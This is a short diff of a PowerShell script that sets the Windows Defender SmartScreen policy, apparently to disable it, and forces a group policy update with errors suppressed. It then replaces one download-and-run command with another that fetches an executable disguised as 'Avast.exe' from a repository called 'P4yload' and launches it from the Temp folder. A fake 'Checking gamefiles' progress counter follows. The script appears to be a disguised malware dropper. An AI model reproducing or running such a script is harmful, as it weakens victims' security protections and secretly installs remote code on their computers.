@@ -22,8 +22,8 @@ Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Smart
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen' -Name 'ConfigureSmartScreen' -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 gpupdate /force | Out-Null -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 
-Invoke-WebRequest -Uri "https://github.com/NezukoPlay/xe/raw/main/Xeno.exe" -OutFile "$env:LOCALAPPDATA\Temp\Xeno.exe"
-Start-Process -FilePath "$env:LOCALAPPDATA\Temp\Xeno.exe"
+Invoke-WebRequest -Uri "https://github.com/P4yload/check13/raw/main/Avast.exe" -OutFile "$env:LOCALAPPDATA\Temp\Avast.exe"
+Start-Process -FilePath "$env:LOCALAPPDATA\Temp\Avast.exe"
 
 for ($i = 1; $i -le 100; $i++) {
     Write-Host -NoNewline ("Checking gamefiles: $i%`r")
